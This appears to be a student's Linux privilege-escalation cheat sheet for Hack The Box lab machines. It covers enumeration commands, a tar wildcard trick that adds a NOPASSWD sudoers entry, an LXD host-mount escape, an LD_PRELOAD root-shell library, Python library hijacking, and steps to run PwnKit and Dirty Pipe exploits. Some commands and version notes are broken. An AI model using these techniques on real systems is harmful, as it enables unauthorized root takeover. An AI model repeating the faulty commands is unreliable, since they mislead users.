

## Tools
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [GTFOBins](https://gtfobins.org/)


## Initial Enumeration base commands 

```bash

## General Stuff 
whoami
id
hostname
ps au # Logged in userse 
cat /etc/passwd

## System Internals 

### Hardware 
lscpu
cat /proc/version # Getting Kernel Versions
uname -a 
cat /etc/os-release # Getting the os
lsblk
df -h #Show mounted file systems

### Logs etc
lastlog # Shows you the last user logins 
w # Shows you the logged in users 
history
find / -type f \( -name *_hist -o -name *_history \) - exec ls -l {} \; 2>/dev/null

## Environment 
echo $PATH  #Discover which binaries will be used 
env #Getting the environment variables 

## Networking 
ip a
route 
netstat -rn
cat /etc/resolv.conf
cat /etc/hosts
arp -a 
ss -tlpn

## Permissions 
sudo -l
getent group sudo
cat /etc/group
cat /etc/shells #gives you the valid login shells 

find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null # Find suid files
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null # Find guid files


## Automation Stuff 
cat /etc/fstab # Getting  the cron entries 
ls -la /etc/cron.daily # List Cronjobs


## Applications

apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_gkss.list 

### First list binaries and then use gtfobins to check for outdated versions
ls -l /bin /usr/bin/ /usr/sbin
for i in $(curl -s https://gtfobins.org/api.json) | jq -r '.executables | keys[]'); do if grep -q "$i" installed_pkgs.list; then echo "Check for GTFO: $i";fi; done


## Processes 
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
ps aux | grep root
strace ping -c1 8.8.8.8 # Tracking system calls and process signals using strace

## Configurations 

find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"


```


## Credential Hunting 

```bash
# Fetch username pw from wp-config.php file 
grep 'DB_USER\|DB_PASSWORD' wp-config.php

# Checking the ssh directory for keys 
ls ~/.ssh

```

## Path Abuse
```bash
# Get Path variables
echo $PATH

# Adding Binaries to the path
PATH=.:${PATH}
export PATH
echo $PATH

## The commands above can then be used to run a path abuse like this 
touch ls 
echo 'echo "PATH ABUSE!!"'  > ls
chmod +x ls # Now the ls command should return you the PATH ABUSE!! string
```

## Wildcard abuse 

```bash
# Example can be done with tar, since it has the option of checkpoints for example this command. And assuming this command runs in a cronjob
tar -zcf /home/htb-student/backup.tar.gz *

## Creating the script to give sudoers permissions 
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh

## Create empty files, which do get expaneded in the tar command as flags
echo "" > "-checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1

## if all the three files are in the correspoinding directory the cronjob will expand the command to the following
tar -zcf /home/htb-student/backup.tar.gz --checkpoint-action=exec=sh root.sh --checkpoint=1 

```


## Escaping/Bypass Restricted Shells 
Restricted shells only let you run a specifik set of commands. Typical such chells are:
- RBASH
- RKSH
- RZSH

```bash
# There are multiple ways to escape it 

## Command Injection example 
ls -l `pwd`


```

## Special Permissions

```bash

```

## Sudo right abuse 
```bash
# List sudoer stuff
sudo -l
```


## Privileged Groups - LXC /LXD
LXD is ubuntus container manager. All users for are added to the lxd group, so you can try to escalate privilegeds voer lxd container 
```bash
# Create a container with privesc possibility 
lxc init ubuntutemp privesc -c security.privileged=true

# Now mount the host system into the container
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true 

# Start the container 
lxc start privesc
lxc exec privesc /bin/bash

```


## Logrotate 
is used to periodically rotate the logs. To be able to do some privesc the following conditions must be true:
- We need write permissions on the log files
- logrotate must run as a privileged user or root
- vulnerable versions
	- 3.8.6
	- 3.11.0
	- 3.15.0
	- 3.18.0
```bash
# Config
cat /etc/logrotate.conf
ls /etc/logrotate.d/ # Here you will find some configs for each and every service

```

## Hijack Tmux Session
For many reasons, a user may leave a tmux process running as a privileged user, such as root. Hijacking can be done using the following commands 

```bash
tmux -S /shareds new -s debusess 
chown root:devs /shareds 

```


## Enumerating Capabilities 

```bash
# Finding binaries which have capabilities set 
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

## Have a look at running processes using pspy

```bash
# Helps you to show processes also runned by other users. Under the hood it is using procfs - Arguments tell it to print commands and file system events and -i tells it to scan procfs every 10000ms (so every second)
./pspy64 -pf -i 1000
```


# Internal Based PrivEsc

## Kernel Exploits 
In a nutshell... just google for an exploit for your specific kernel version. If there is an exploit you will have to compile it on your own and then run it on the target system (also compile it on the target system, since it must be this architecture and kernel and nothing else)
```bash
# Get Kernel Information 
uname -a
cat /etc/lsb-release 
```

## Shared Libraries 
Two types of libraries exist in Linux:
- static libraries -> denoted by the .q file extension
- dynamically linked shared object libraries -> denoted by the .so file extension
- To be able to execute this, you have to do an LD_PRELOAD with your own created `.so` file.

You can create your own so using the following C code
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

And then compile it as following 

```bash
 gcc -fPIC -shared -o root.so root.c -nostartfiles
```

After that you can run a binary, which you are able to execute as root as the following 
(in that case sudo -l provided me the openssl command)

```bash
sudo LD_PRELOAD=/home/htb-student/root.so openssl
```


## Shared Object Hijacking
Using the ldd command we can look for non-standard ibraries used in a binary. Non-Standard libraries can be loaded using for example `RUNPATH`. If specific locations are used and the directory is writtable by your user, we can add libraries, that help us to do privesc.

```bash
# List Dynamic Dependencies
# It prints the shared libraries (`.so` files) that a given executable or shared object requires at runtime.
ldd

# `readelf` is a tool for inspecting **ELF (Executable and Linkable Format)** files — the standard binary format on Linux. Unlike `ldd`, it performs **purely static analysis** — it never executes the binary, making it safe for malware analysis.
readelf -d payload
```

## Python Library Hijacking

There are three basic vulnerabilities to hijack with python:
	1. Wrong write permissions
	2. Library Path
	3. PYTHONPATH environment Variable 

### Wrong write permission 
For this you search for python scripts with set SUID. If it is set, you can check the script for some imports and method calls. Once you found some, you can drill dowin under the python modules (for example /usr/local/lib/python3.87dist-packages/psutil/...) and try to discover the method. Once the method is discovered you can plant some code to execute as root and voila, you got root access 

```python
...SNIP...

def virtual_memory():

    ...SNIP...
    #### Hijacking
    import os
    os.system('id')
    

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...


```


### Library Path 

In python when listing the `PYTHONPATH` variable, the higher up in the list something is the higher the priority. In case you have write access to the upper directories, you can try to add some used modules in those higher directories, to escalate privileges. 
![[python_path_hijacking.png]]



### PYTHONPATH environment variable 





# Recent 0-Days 
## Sudo 

- `/etc/sudoers` -> specifies which users or groups are allowed to run specific programs and with what privileges 

### CVE-2021-3156
Applies to specific versions such as 
- Ubuntu 20.04; Kernel 1.8.31
- Debian 10 ; Kernel Version 1.8.27
- Fedora 33; Kernel Version 1.9.2 etc.
Checkout the corresponding Gitrepository for the xploit -> hax something

### CVE-2019-14287 - Sudo Policy Bypass (crazy stuff!!!)

Prerequistite: Sudo version below `1.8.28`
- If there is any command which can be used as sudo you can run `sudo -u#1 /bin/your-command` to become sudo! Crazy stuff


## Polkit 
Stands for Policy Kit and can be used as a tool for more fine-granular permission handling.

```bash 
# In general execute a command as a different user using polkit
pkexec -u <user> <command> 
pkexec -u root id 

# Existing vunlerability is called Pwnkit -> CVE-2021-4034 can be used for privesc
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c poc
./poc
```


## Dirty Pipe - CVE-2022-0847
Allows unauthorized writing to root use files on Linux.

Prerequisite:
- Kernel version; 5.8 to 5.17

```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh

# Exploit 1 - Condition are the kernel versions 
uname -r # to check kernel versions and if it matches 
./exploit-1

# Exploit 2 - Exploit using the SUID Binaries  
find / -perm -4000 2>/dev/null #Find suid files and select one 
./exploit-2 /usr/bin/sudo

```


## Netfilter - CVE-2022-1015 and CVE-2022-25636 and CVE-2023-32233
Is a linux kernel module, that provides among other things, packet filtering, NAT and other firewall stuff.

# Other Stuff

## Typical Defense Tools that could be in place on the systems 

- Exec Shield
- iptables
- AppArmour
- SELinux
- Fail2ban
- Snort
- Uncomplicated Firewall (ufw)

# Open Questions 

- What is diff between /usr/bin and /usr/sbin
- What are symlinks and when to actually use those?
- How does this with the linux permissions actually work, and how would I set up a properly multiuser system... And when would this make the most sense?
- How to write some proper loops in bash, which I can use?
- How to properly work with jq 
- Try to better undstand this piping stuff. Especially `mkfifo`
- Any shell to use in 2026, which gives you some sweet sweet benefits
- What is with this setuid and setguid -> Don't get this sticky bit stuff
- Explain what Linux Capabilities are
- What is adynamically linked shared object library?
- What is Nagios and how can it be used?